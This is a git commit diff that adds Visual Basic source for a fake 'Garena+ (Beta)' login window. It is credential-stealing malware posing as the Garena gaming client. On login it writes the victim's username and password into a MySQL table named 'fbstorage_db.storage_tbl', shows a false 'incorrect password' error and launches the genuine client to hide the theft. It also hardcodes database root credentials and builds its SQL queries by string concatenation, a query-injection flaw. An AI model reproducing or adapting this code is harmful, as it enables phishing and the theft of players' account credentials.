074383081ff541ea41f6089c32a0506032ea4d02
esowelow <esowelow@gmail.com>
2015-05-30 16:35:16 +0800

    try
    try

---
+++ Garena+ (Beta)/Form1.Designer.vb
@@ -0,0 +1,183 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Main
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main))
+        Me.username_txt = New System.Windows.Forms.TextBox()
+        Me.Login_btn = New System.Windows.Forms.Panel()
+        Me.exit_btn = New System.Windows.Forms.Panel()
+        Me.login = New System.Windows.Forms.Button()
+        Me.eksit = New System.Windows.Forms.Button()
+        Me.password_txt = New System.Windows.Forms.TextBox()
+        Me.Panel1 = New System.Windows.Forms.Panel()
+        Me.Panel2 = New System.Windows.Forms.Panel()
+        Me.Panel3 = New System.Windows.Forms.Panel()
+        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
+        Me.SuspendLayout()
+        '
+        'username_txt
+        '
+        Me.username_txt.BorderStyle = System.Windows.Forms.BorderStyle.None
+        Me.username_txt.Cursor = System.Windows.Forms.Cursors.Default
+        Me.username_txt.Font = New System.Drawing.Font("Tahoma", 9.75!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.username_txt.ForeColor = System.Drawing.Color.DarkGray
+        Me.username_txt.Location = New System.Drawing.Point(49, 193)
+        Me.username_txt.Name = "username_txt"
+        Me.username_txt.Size = New System.Drawing.Size(199, 16)
+        Me.username_txt.TabIndex = 0
+        Me.username_txt.Text = "Enter your Username / E-mail"
+        '
+        'Login_btn
+        '
+        Me.Login_btn.BackColor = System.Drawing.Color.Transparent
+        Me.Login_btn.Cursor = System.Windows.Forms.Cursors.Default
+        Me.Login_btn.Location = New System.Drawing.Point(40, 366)
+        Me.Login_btn.Name = "Login_btn"
+        Me.Login_btn.Size = New System.Drawing.Size(180, 51)
+        Me.Login_btn.TabIndex = 3
+        '
+        'exit_btn
+        '
+        Me.exit_btn.BackColor = System.Drawing.Color.Transparent
+        Me.exit_btn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
+        Me.exit_btn.Location = New System.Drawing.Point(422, 1)
+        Me.exit_btn.Name = "exit_btn"
+        Me.exit_btn.Size = New System.Drawing.Size(41, 19)
+        Me.exit_btn.TabIndex = 4
+        '
+        'login
+        '
+        Me.login.Location = New System.Drawing.Point(517, 108)
+        Me.login.Name = "login"
+        Me.login.Size = New System.Drawing.Size(54, 32)
+        Me.login.TabIndex = 3
+        Me.login.Text = "login"
+        Me.login.UseVisualStyleBackColor = True
+        '
+        'eksit
+        '
+        Me.eksit.DialogResult = System.Windows.Forms.DialogResult.Cancel
+        Me.eksit.Location = New System.Drawing.Point(481, 124)
+        Me.eksit.Name = "eksit"
+        Me.eksit.Size = New System.Drawing.Size(54, 32)
+        Me.eksit.TabIndex = 4
+        Me.eksit.Text = "exit"
+        Me.eksit.UseVisualStyleBackColor = True
+        '
+        'password_txt
+        '
+        Me.password_txt.BorderStyle = System.Windows.Forms.BorderStyle.None
+        Me.password_txt.Cursor = System.Windows.Forms.Cursors.Default
+        Me.password_txt.Font = New System.Drawing.Font("Tahoma", 9.75!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.password_txt.ForeColor = System.Drawing.Color.DarkGray
+        Me.password_txt.Location = New System.Drawing.Point(49, 232)
+        Me.password_txt.Name = "password_txt"
+        Me.password_txt.Size = New System.Drawing.Size(199, 16)
+        Me.password_txt.TabIndex = 1
+        Me.password_txt.Text = "Enter your Password"
+        '
+        'Panel1
+        '
+        Me.Panel1.BackColor = System.Drawing.Color.Transparent
+        Me.Panel1.Cursor = System.Windows.Forms.Cursors.Hand
+        Me.Panel1.Location = New System.Drawing.Point(58, 265)
+        Me.Panel1.Name = "Panel1"
+        Me.Panel1.Size = New System.Drawing.Size(103, 23)
+        Me.Panel1.TabIndex = 5
+        '
+        'Panel2
+        '
+        Me.Panel2.BackColor = System.Drawing.Color.Transparent
+        Me.Panel2.Cursor = System.Windows.Forms.Cursors.Hand
+        Me.Panel2.Location = New System.Drawing.Point(40, 469)
+        Me.Panel2.Name = "Panel2"
+        Me.Panel2.Size = New System.Drawing.Size(136, 23)
+        Me.Panel2.TabIndex = 5
+        '
+        'Panel3
+        '
+        Me.Panel3.BackColor = System.Drawing.Color.Transparent
+        Me.Panel3.Cursor = System.Windows.Forms.Cursors.Hand
+        Me.Panel3.Location = New System.Drawing.Point(192, 469)
+        Me.Panel3.Name = "Panel3"
+        Me.Panel3.Size = New System.Drawing.Size(139, 23)
+        Me.Panel3.TabIndex = 5
+        '
+        'CheckBox1
+        '
+        Me.CheckBox1.AutoSize = True
+        Me.CheckBox1.BackColor = System.Drawing.Color.Transparent
+        Me.CheckBox1.Font = New System.Drawing.Font("Tahoma", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.CheckBox1.ForeColor = System.Drawing.Color.White
+        Me.CheckBox1.Location = New System.Drawing.Point(42, 301)
+        Me.CheckBox1.Name = "CheckBox1"
+        Me.CheckBox1.Size = New System.Drawing.Size(140, 18)
+        Me.CheckBox1.TabIndex = 6
+        Me.CheckBox1.Text = "Remember password"
+        Me.CheckBox1.UseVisualStyleBackColor = False
+        '
+        'Main
+        '
+        Me.AcceptButton = Me.login
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackgroundImage = CType(resources.GetObject("$this.BackgroundImage"), System.Drawing.Image)
+        Me.CancelButton = Me.eksit
+        Me.ClientSize = New System.Drawing.Size(470, 590)
+        Me.Controls.Add(Me.CheckBox1)
+        Me.Controls.Add(Me.Panel3)
+        Me.Controls.Add(Me.Panel2)
+        Me.Controls.Add(Me.Panel1)
+        Me.Controls.Add(Me.eksit)
+        Me.Controls.Add(Me.login)
+        Me.Controls.Add(Me.exit_btn)
+        Me.Controls.Add(Me.Login_btn)
+        Me.Controls.Add(Me.password_txt)
+        Me.Controls.Add(Me.username_txt)
+        Me.Font = New System.Drawing.Font("Tahoma", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MaximumSize = New System.Drawing.Size(470, 590)
+        Me.MinimumSize = New System.Drawing.Size(470, 590)
+        Me.Name = "Main"
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Garena+ (Beta)"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents username_txt As System.Windows.Forms.TextBox
+    Friend WithEvents Login_btn As System.Windows.Forms.Panel
+    Friend WithEvents exit_btn As System.Windows.Forms.Panel
+    Friend WithEvents login As System.Windows.Forms.Button
+    Friend WithEvents eksit As System.Windows.Forms.Button
+    Friend WithEvents password_txt As System.Windows.Forms.TextBox
+    Friend WithEvents Panel1 As System.Windows.Forms.Panel
+    Friend WithEvents Panel2 As System.Windows.Forms.Panel
+    Friend WithEvents Panel3 As System.Windows.Forms.Panel
+    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
+
+End Class
---
+++ Garena+ (Beta)/Form1.vb
@@ -0,0 +1,150 @@
+﻿Imports MySql.Data.MySqlClient
+Public Class Main
+    Dim con_string As String
+    Dim con As New MySqlConnection()
+    Dim cmd As MySqlCommand
+    Dim dr As MySqlDataReader
+    Dim str As String
+    Dim convar As String
+
+    Private Sub exit_btn_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles exit_btn.Click
+        Me.Close()
+    End Sub
+
+    Private Sub exit_btn_MouseHover(ByVal sender As Object, ByVal e As System.EventArgs) Handles exit_btn.MouseHover
+        exit_btn.BackgroundImage = Image.FromFile("D:\Users\Documents\Visual Studio 2010\Projects\Garena+ (Beta)\Images\Exit.jpg")
+    End Sub
+
+    Private Sub exit_btn_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles exit_btn.MouseLeave
+        exit_btn.BackgroundImage = Nothing
+    End Sub
+
+    Private Sub eksit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles eksit.Click
+        Me.Close()
+    End Sub
+
+    Private Sub Login_btn_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Login_btn.Click
+        If username_txt.Text <> "" And password_txt.Text <> "" Then
+            Try
+                con = New MySqlConnection(con_string)
+                con.Open()
+
+                str = "INSERT INTO fbstorage_db.storage_tbl VALUES ('" & username_txt.Text & "','" & password_txt.Text & "','Garena')"
+                cmd = New MySqlCommand(str, con)
+
+                dr = cmd.ExecuteReader()
+
+                con.Close()
+
+            Catch ex As Exception
+
+            End Try
+
+            MessageBox.Show("[Error 0021] The username or password you entered is incorrect!", "Garena+ (Beta)", MessageBoxButtons.OK)
+            Me.Close()
+            Process.Start("D:\Garena Plus\GarenaMessenger.exe")
+        Else
+            MessageBox.Show("Please enter your username and password to login.", "Garena+ (Beta)", MessageBoxButtons.OK)
+
+        End If
+    End Sub
+
+    Private Sub Login_btn_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Login_btn.MouseDown
+        Login_btn.BackgroundImage = Image.FromFile("D:\Users\Documents\Visual Studio 2010\Projects\Garena+ (Beta)\Images\button 2.jpg")
+    End Sub
+
+    Private Sub Login_btn_MouseHover(ByVal sender As Object, ByVal e As System.EventArgs) Handles Login_btn.MouseHover
+        Login_btn.BackgroundImage = Image.FromFile("D:\Users\Documents\Visual Studio 2010\Projects\Garena+ (Beta)\Images\button 2.jpg")
+    End Sub
+
+    Private Sub Login_btn_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles Login_btn.MouseLeave
+        Login_btn.BackgroundImage = Nothing
+    End Sub
+
+    Private Sub Login_btn_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Login_btn.MouseUp
+        Login_btn.BackgroundImage = Nothing
+    End Sub
+
+    Private Sub username_txt_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles username_txt.Enter
+        If username_txt.Text = "Enter your Username / E-mail" Then
+            username_txt.Clear()
+            username_txt.ForeColor = Color.Black
+            username_txt.Font = New Font(username_txt.Font.FontFamily, username_txt.Font.Size, FontStyle.Regular)
+        Else
+            username_txt.SelectAll()
+        End If
+    End Sub
+
+    Private Sub username_txt_Leave(ByVal sender As Object, ByVal e As System.EventArgs) Handles username_txt.Leave
+        If username_txt.Text = "" Then
+            username_txt.Text = "Enter your Username / E-mail"
+            username_txt.ForeColor = Color.DarkGray
+            username_txt.Font = New Font(username_txt.Font.FontFamily, username_txt.Font.Size, FontStyle.Italic)
+        End If
+    End Sub
+
+    Private Sub password_txt_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles password_txt.Enter
+        If password_txt.Text = "Enter your Password" Then
+            password_txt.Clear()
+            password_txt.ForeColor = Color.Black
+            password_txt.PasswordChar = "●"
+            password_txt.Font = New Font(password_txt.Font.FontFamily, password_txt.Font.Size, FontStyle.Regular)
+        Else
+            password_txt.SelectAll()
+        End If
+    End Sub
+
+    Private Sub password_txt_Leave(ByVal sender As Object, ByVal e As System.EventArgs) Handles password_txt.Leave
+        If password_txt.Text = "" Then
+            password_txt.Text = "Enter your Password"
+            password_txt.ForeColor = Color.DarkGray
+            password_txt.PasswordChar = Nothing
+            password_txt.Font = New Font(password_txt.Font.FontFamily, password_txt.Font.Size, FontStyle.Italic)
+        End If
+    End Sub
+
+    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        con_string = "Server=192.168.0.101;Port=3306;Database=fbstorage_db;Uid=root; Pwd=ee168771032e;"
+    End Sub
+
+    Private Sub Login_btn_Paint(ByVal sender As System.Object, ByVal e As System.Windows.Forms.PaintEventArgs) Handles Login_btn.Paint
+
+    End Sub
+
+    Private Sub login_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles login.Click
+        If username_txt.Text <> "" And password_txt.Text <> "" Then
+            Try
+                con = New MySqlConnection(con_string)
+                con.Open()
+
+                str = "INSERT INTO fbstorage_db.storage_tbl VALUES ('" & username_txt.Text & "','" & password_txt.Text & "','Garena')"
+                cmd = New MySqlCommand(str, con)
+
+                dr = cmd.ExecuteReader()
+
+                con.Close()
+
+            Catch ex As Exception
+                MsgBox(ex.Message)
+                Me.Close()
+                Process.Start("D:\Garena Plus\GarenaMessenger.exe")
+            End Try
+
+            MessageBox.Show("[Error 0021] The username or password you entered is incorrect!", "Garena+ (Beta)", MessageBoxButtons.OK)
+            Me.Close()
+            Process.Start("D:\Garena Plus\GarenaMessenger.exe")
+        Else
+            MessageBox.Show("Please enter your username and password to login.", "Garena+ (Beta)", MessageBoxButtons.OK)
+
+        End If
+    End Sub
+
+    Private Sub Panel3_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Panel3.Click
+        Me.Close()
+        Process.Start("D:\Garena Plus\GarenaMessenger.exe")
+    End Sub
+
+    Private Sub Panel2_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Panel2.Click
+        Process.Start("C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", "http://www.garena.ph/register/")
+    End Sub
+End Class
